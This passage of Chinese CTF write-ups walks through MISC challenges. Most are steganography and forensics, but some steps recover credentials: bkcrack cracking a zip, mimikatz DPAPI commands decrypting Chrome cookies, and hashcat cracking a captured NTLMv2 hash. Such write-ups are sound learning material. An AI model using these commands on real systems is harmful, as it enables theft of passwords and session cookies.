class="code"><pre><span class="line"># Bkcrack 明文爆破</span><br><span class="line">&#x27;/root/Desktop/bkcrack-1.5.0-Linux/bkcrack&#x27; -C &#x27;/root/Desktop/flag.zip&#x27; -c hint.jpg -P &#x27;/root/Desktop/93efed7690954db78b5ce6e466d99420.zip&#x27;  -p hint.jpg</span><br><span class="line"></span><br><span class="line"># afb9fee3 f8795353 f6de1d4e </span><br></pre></td></tr></table></figure><p><img src="/2023-%E5%8F%A4%E5%89%91%E5%B1%B1-MISC-WP/1702009979292-b7c5f475-50e4-486c-af94-e82c8c273a26.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 修改密码</span><br><span class="line">&#x27;/root/Desktop/bkcrack-1.5.0-Linux/bkcrack&#x27; -C &#x27;/root/Desktop/flag.zip&#x27; -c hint.jpg -k afb9fee3 f8795353 f6de1d4e -U &#x27;/root/Desktop/out.zip&#x27; 123456</span><br></pre></td></tr></table></figure><p><img src="/2023-%E5%8F%A4%E5%89%91%E5%B1%B1-MISC-WP/1702010044498-c1ade7f1-2075-4ec1-b97a-a7f3cdcb1b59.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 获取password</span><br><span class="line">* NTLM : 786515ed10d6b79e74c1739f72a158cc &gt; 54231</span><br><span class="line"></span><br><span class="line"># 获取masterkey</span><br><span class="line">mimikatz # dpapi::masterkey /in:C:\Users\HK\Desktop\out\S-1-5-21-726299542-2485387390-1117163988-1001\e5f8e386-7041-4f16-b02d-304c71040126 /password:54231</span><br><span class="line">&gt; key : 7a4d2ffbb42d0a1ab46f0351260aef16cae699e03e9d6514b3bf10e2977c5d228fda4a48e39b7b8a06a443c39653c2a3c3656596e7edc84e1c9682511c8343ac</span><br><span class="line"></span><br><span class="line"># 解密cookie</span><br><span class="line">mimikatz # dpapi::chrome /in:C:\Users\HK\Desktop\out\Cookies /masterkey:7a4d2ffbb42d0a1ab46f0351260aef16cae699e03e9d6514b3bf10e2977c5d228fda4a48e39b7b8a06a443c39653c2a3c3656596e7edc84e1c9682511c8343ac</span><br><span class="line">&gt; Cookie: flag&#123;mimikatz_is_bravo_xz12ss&#125;</span><br></pre></td></tr></table></figure><h2 id="jpginside"><a href="#jpginside" class="headerlink" title="jpginside"></a>jpginside</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改后缀为pyc，进行pyc反编译，结果：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">store = [</span></span><br><span class="line"><span class="string">    111,</span></span><br><span class="line"><span class="string">    217,</span></span><br><span class="line"><span class="string">    97,</span></span><br><span class="line"><span class="string">    ...</span></span><br><span class="line"><span class="string">    ...</span></span><br><span class="line"><span class="string">    116,</span></span><br><span class="line"><span class="string">    101,</span></span><br><span class="line"><span class="string">    49,</span></span><br><span class="line"><span class="string">    50]</span></span><br><span class="line"><span class="string">key = raw_input(&#x27;Please input the key:&#x27;)</span></span><br><span class="line"><span class="string">with open(&#x27;excellent.jpg&#x27;, &#x27;wb&#x27;) as jpg:</span></span><br><span class="line"><span class="string">    for i in range(len(store)):</span></span><br><span class="line"><span class="string">        jpg.write(chr(store[i] ^ ord(key[i % len(key)])))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 修复为可执行代码</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">store = [</span></span><br><span class="line"><span class="string">    111,</span></span><br><span class="line"><span class="string">    217,</span></span><br><span class="line"><span class="string">    97,</span></span><br><span class="line"><span class="string">    ...</span></span><br><span class="line"><span class="string">    ...</span></span><br><span class="line"><span class="string">    116,</span></span><br><span class="line"><span class="string">    101,</span></span><br><span class="line"><span class="string">    49,</span></span><br><span class="line"><span class="string">    50]</span></span><br><span class="line"><span class="string">key = b&#x27;rotate1234!&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">with open(&#x27;excellent.jpg&#x27;, &#x27;wb&#x27;) as jpg:</span></span><br><span class="line"><span class="string">    for i in range(len(store)):</span></span><br><span class="line"><span class="string">        jpg.write(bytes([store[i] ^ key[i % len(key)]]))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 逆向出key</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">data = [<span class="number">141</span>,</span><br><span class="line">        <span class="number">183</span>,</span><br><span class="line">        <span class="number">139</span>,</span><br><span class="line">        <span class="number">129</span>,</span><br><span class="line">        <span class="number">116</span>,</span><br><span class="line">        <span class="number">117</span>,</span><br><span class="line">        <span class="number">123</span>,</span><br><span class="line">        <span class="number">116</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">114</span>,</span><br><span class="line">        <span class="number">33</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">110</span>,</span><br><span class="line">        <span class="number">117</span>,</span><br><span class="line">        <span class="number">97</span>,</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">jpg = binascii.unhexlify(<span class="string">&#x27;FFD8FFE000104A4649460001010101&#x27;</span>)</span><br><span class="line">data = <span class="built_in">bytes</span>(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(jpg),<span class="built_in">len</span>(data))</span><br><span class="line">out = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    out += <span class="built_in">chr</span>(data[i] ^ jpg[i])</span><br><span class="line"><span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="comment"># key = rotate1234!</span></span><br></pre></td></tr></table></figure><p>执行之前修复好的代码，本地生成了excellent.jpg，分离末尾的zip文件<br><img src="/2023-%E5%8F%A4%E5%89%91%E5%B1%B1-MISC-WP/1702011011796-73f3e149-896c-4b23-92a3-cda7c7f9f0f8.png" alt="image.png"><br>修复字节，使用 key 解开压缩包得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jpek&#123;39i0jf49229fie5j33f02403hj953012&#125;</span><br><span class="line">rot22: flag&#123;39e0fb49229bea5f33b02403df953012&#125;</span><br></pre></td></tr></table></figure><h2 id="数独"><a href="#数独" class="headerlink" title="数独"></a>数独</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gaps run &#x27;/root/Desktop/image.png&#x27; &#x27;/root/Desktop/out.png&#x27; --size=70</span><br></pre></td></tr></table></figure><p><img src="/2023-%E5%8F%A4%E5%89%91%E5%B1%B1-MISC-WP/1702011237365-4c74f369-25cf-4128-a55f-8e7cbdf30676.png" alt="image.png"><br><img src="/2023-%E5%8F%A4%E5%89%91%E5%B1%B1-MISC-WP/1702011256656-e2310c55-97dc-4eac-a467-371b5f33544c.png" alt="out.png"><br>将最后一列区块移动至最前，按顺序读取flag即可</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 极客大挑战 MISC WP</title>
      <link href="/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-MISC-WP/"/>
      <url>/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-MISC-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="ez-smilemo"><a href="#ez-smilemo" class="headerlink" title="ez_smilemo"></a>ez_smilemo</h2><p><img src="/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-MISC-WP/1701015488723-f2123da4-84d5-44fc-a7ff-04727a77e577.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UndertaleModTool解包data.win，在字符串最后的内容中找到flag</span><br><span class="line">c20xbGVfMXNfQF9uMWNlX2dAbWU=</span><br><span class="line"></span><br><span class="line">base64:</span><br><span class="line">sm1le_1s_@_n1ce_g@me</span><br></pre></td></tr></table></figure><h2 id="Qingwan的心要碎了"><a href="#Qingwan的心要碎了" class="headerlink" title="Qingwan的心要碎了"></a>Qingwan的心要碎了</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度识图：</span><br><span class="line">重庆中国三峡博物馆</span><br></pre></td></tr></table></figure><h2 id="时代的眼泪"><a href="#时代的眼泪" class="headerlink" title="时代的眼泪"></a>时代的眼泪</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">取证大师 -&gt; 最近访问 -&gt; 图片内容</span><br><span class="line">SYC&#123;You_defeated_me_after_22_years&#125;</span><br></pre></td></tr></table></figure><h2 id="下一站是哪儿呢"><a href="#下一站是哪儿呢" class="headerlink" title="下一站是哪儿呢"></a>下一站是哪儿呢</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">airport.png</span><br><span class="line">百度识图：宝安国际机场</span><br><span class="line"></span><br><span class="line">分离出 1.jpg 的压缩包</span><br><span class="line">binwalk -e 1.jpg</span><br><span class="line"></span><br><span class="line">解压压缩包得到以下图片，进行识图得到码表</span><br></pre></td></tr></table></figure><p><img src="/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-MISC-WP/1701007603222-996238d2-5c1b-441c-aa3c-35e74c168a93.png" alt="secret.png"><br><img src="/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-MISC-WP/1701007764229-41f76528-24e6-4839-ab3d-2026f352caab.png" alt="20171023182559801.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">对照码表得到</span><br><span class="line">i want to go to liquor city</span><br><span class="line">搜寻得到酒城指泸州</span><br><span class="line"></span><br><span class="line">总结得到以下信息：</span><br><span class="line">1.宝安国际机场 -&gt; 泸州 </span><br><span class="line">2.航班飞行时间在21:00左右</span><br><span class="line"></span><br><span class="line">尝试后面几天的航班即可得到</span><br><span class="line">SYC&#123;CZ8579_Luzhou&#125;</span><br></pre></td></tr></table></figure><h2 id="xqr"><a href="#xqr" class="headerlink" title="xqr"></a>xqr</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 分离出需要异或的图片</span><br><span class="line">binwalk -e xqr.png</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将图像改尺寸修改</span></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;out.png&#x27;</span>)</span><br><span class="line">im= im.resize((<span class="number">75</span>,<span class="number">75</span>))</span><br><span class="line">im.save(<span class="string">&#x27;out2.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>异或<img src="/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-MISC-WP/1701008762900-02c9e7b5-b4ae-4119-ad93-c739afc65249.bmp" alt="solved.bmp"><br>反色<img src="/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-MISC-WP/1701008786734-4c63cf2b-683d-4bb3-bbe4-e0f942ebe25d.jpeg" alt="solved.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;hOp3_u_h@ve_Fun&#125;</span><br></pre></td></tr></table></figure><h2 id="extractMe"><a href="#extractMe" class="headerlink" title="extractMe"></a>extractMe</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">crc_list = [<span class="number">0x8712de1d</span>, <span class="number">0x06eacbd7</span>, <span class="number">0x20a8e291</span>, <span class="number">0x31ee3074</span>, <span class="number">0x77aacf7f</span>, <span class="number">0x35fb7c6c</span>, <span class="number">0xf978d5aa</span>, <span class="number">0x016f7a0b</span>]</span><br><span class="line">wordlist = string.printable</span><br><span class="line">data_list = itertools.product(wordlist, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> data_list:</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span>.join(data)</span><br><span class="line"></span><br><span class="line">    crc = binascii.crc32(data.encode())</span><br><span class="line">    <span class="keyword">if</span> crc <span class="keyword">in</span> crc_list:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(crc_list)):</span><br><span class="line">            <span class="keyword">if</span> crc == crc_list[i]:</span><br><span class="line">                crc_list[i] = data</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(crc_list))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;_cR@ck_1s_Useful_sometime$_&#125;</span></span><br></pre></td></tr></table></figure><h2 id="DEATH-N0TE"><a href="#DEATH-N0TE" class="headerlink" title="DEATH_N0TE"></a>DEATH_N0TE</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;kamisama.png&#x27;</span>)</span><br><span class="line">start_pixel = (<span class="number">5</span>, <span class="number">5</span>)</span><br><span class="line">size = <span class="number">10</span></span><br><span class="line">out = Image.new(<span class="string">&#x27;RGB&#x27;</span>, ((im.size[<span class="number">0</span>] - start_pixel[<span class="number">0</span>]) // size, (im.size[<span class="number">1</span>] - start_pixel[<span class="number">1</span>]) // size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>((im.size[<span class="number">1</span>] - start_pixel[<span class="number">1</span>]) // size):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>((im.size[<span class="number">0</span>] - start_pixel[<span class="number">0</span>]) // size):</span><br><span class="line">        pixel = im.getpixel((start_pixel[<span class="number">0</span>] + x * size, start_pixel[<span class="number">1</span>] + y * size))</span><br><span class="line">        out.putpixel((x, y), pixel)</span><br><span class="line"></span><br><span class="line">out.show()</span><br></pre></td></tr></table></figure><p><img src="/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-MISC-WP/1701006735485-acc91a6a-a7a6-4cef-a979-a0f6f1c18446.png" alt="out.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35229002/1701007282170-9eaf0bac-1f67-49ae-be6a-76272c9d0ce4.png" alt="2.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省略此步骤，复现对照码表麻烦</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; zsteg kamisama.png</span><br><span class="line">&gt;&gt;&gt; IuS9oOe7p+e7reinguWvn+aJi+S4iua8hum7keiJsueahOeslOiusOacrO+8jOWGt+mdmeS4i+adpeeahOS9oOWPkeeOsOS6huiXj+WcqOWwgemdouacgOS4i+i+ueeahOS4gOihjOWwj+WtlzpTWUN7RDRAVGhfTjB0NF8iCiLkvaDmtY/op4jov4fmlbTkuKrnrJTorrDmnKzvvIzlj6/mg5zlhajmmK/nqbrnmb3pobXvvIzlhbbkuK3mnInkuIDpobXkuI3nn6XpgZPooqvosIHmkpXmjonkuobvvIzkvaDmnIDnu4jov5jmmK/nv7vliLDkuobnvLrlpLHnmoTpgqPkuIDpobUiCiLkvaDnlKjpk4XnrJTmtoLmirnnnYDlkI7pnaLkuIDpobXvvIzkuIrpnaLnvJPnvJPlh7rnjrDkuobpgZflpLHnmoTnl5Xov7kuLi4i</span><br><span class="line"></span><br><span class="line">base64解码</span><br><span class="line">SYC&#123;D4@Th_N0t4_</span><br><span class="line"></span><br><span class="line">拼接得到flag</span><br></pre></td></tr></table></figure><h2 id="DEATH-N1TE"><a href="#DEATH-N1TE" class="headerlink" title="DEATH_N1TE"></a>DEATH_N1TE</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;killer.webp&#x27;</span>)</span><br><span class="line">n_frame = im.n_frames</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n_frame):</span><br><span class="line">    im.seek(i)</span><br><span class="line">    im.save(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>多图拼接<br><img src="/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-MISC-WP/1701009509671-40e4516e-d540-41a4-8c1b-9ca468045bed.png" alt="图像-1701009403409.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gaps run &#x27;input.png&#x27; &#x27;output.png&#x27; --size=48</span><br></pre></td></tr></table></figure><p><img src="/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-MISC-WP/1701009551427-29ccdd7d-160c-4e2e-8c9b-5be14d69af73.png" alt="out.png"><br>L.mp3中间部分使用mmsstv，得到图像<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35229002/1701009036686-fcf6c731-ff4a-4e20-a3b3-a935bf9911f9.png" alt="9.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;H4xr0t0r__14_Ki114R&#125;</span><br></pre></td></tr></table></figure><h2 id="DEATH-N2TE"><a href="#DEATH-N2TE" class="headerlink" title="DEATH_N2TE"></a>DEATH_N2TE</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">video = cv2.VideoCapture(<span class="string">&#x27;kira.mp4&#x27;</span>)</span><br><span class="line">video_size = [<span class="number">1920</span>, <span class="number">1080</span>]</span><br><span class="line"><span class="comment"># fps: 8 * 24</span></span><br><span class="line"></span><br><span class="line">start_pixel = <span class="number">5</span></span><br><span class="line">size = <span class="number">10</span></span><br><span class="line">out = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (video_size[<span class="number">0</span>] // size, video_size[<span class="number">1</span>] // size))</span><br><span class="line"></span><br><span class="line">fps_count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    success, frame = video.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> success:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>((video_size[<span class="number">1</span>] - start_pixel) // size):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pixel = Image.fromarray(frame).getpixel((start_pixel + fps_count * size, start_pixel + y * size))</span><br><span class="line">            out.putpixel((fps_count, y), pixel)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    fps_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">out.save(<span class="string">&#x27;out.png&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-MISC-WP/1701014039003-904da4a2-ba01-4c15-ad68-d800f9ff3b98.png" alt="out.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;we1c0m4_T0_De@th_W0r1d&#125;</span><br></pre></td></tr></table></figure><h2 id="窃听风云"><a href="#窃听风云" class="headerlink" title="窃听风云"></a>窃听风云</h2><p>NTLM解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">No.7流内容</span><br><span class="line">NTLM Server Challenge: 2af71b5ca7246268</span><br><span class="line"></span><br><span class="line">No.8流内容</span><br><span class="line">User name: jack</span><br><span class="line">Domain name: WIDGETLLC</span><br><span class="line">NTProofStr: 2d1d24572b15fe544043431c59965d30</span><br><span class="line">modified NTLM v2 response:</span><br><span class="line">0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</span><br><span class="line"></span><br><span class="line">以以下格式构造hash:</span><br><span class="line">username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</span><br><span class="line">jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000</span><br><span class="line"></span><br><span class="line">hashcat爆破:</span><br><span class="line">hashcat -m 5600 jack::WIDGETLLC:2af71b5ca7246268:2d1d24572b15fe544043431c59965d30:0101000000000000040d962b02edd901e6994147d6a34af200000000020012005700490044004700450054004c004c004300010008004400430030003100040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0003002e0044004300300031002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c0007000800040d962b02edd90106000400020000000800300030000000000000000000000000300000078cdc520910762267e40488b60032835c6a37604d1e9be3ecee58802fb5f9150a001000000000000000000000000000000000000900200048005400540050002f003100390032002e003100360038002e0030002e0031000000000000000000 &#x27;/root/Desktop/rockyou.txt&#x27;</span><br><span class="line"></span><br><span class="line">SYC&#123;iamjackspassword&#125;</span><br></pre></td></tr></table></figure><h2 id="窃听风云V2"><a href="#窃听风云V2" class="headerlink" title="窃听风云V2"></a>窃听风云V2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">思路如上，不过V2在wireshark里base64内容不会被wireshark解析，需要手动根据特征对照出具体内容</span><br><span class="line"></span><br><span class="line">User name: jack</span><br><span class="line">Domain name: WidgetLLC.Internal</span><br><span class="line">NTLM Server Challenge: 3e3966c8cacd29f7</span><br><span class="line">NTProofStr: ddd46fd8f78c262eae16918f66185497</span><br><span class="line">modified NTLM v2 response:</span><br><span class="line">010100000000000050fd26d235edd9011219408ccb8a364800000000020012005700490044004700450054004c004c0043000100100043004c00490045004e00540030003300040024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000300360043004c00490045004e005400300033002e005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c00050024005700690064006700650074004c004c0043002e0049006e007400650072006e0061006c000700080050fd26d235edd90106000400020000000800300030000000000000000000000000300000c78e803920758ec5672c36696ee163f6a4e61c8b5463c247daef8571677995a40a001000000000000000000000000000000000000900200053004d00540050002f0075006e007300700065006300690066006900650064000000000000000000</span><br><span class="line"></span><br><span class="line">构造hash:</span><br><span 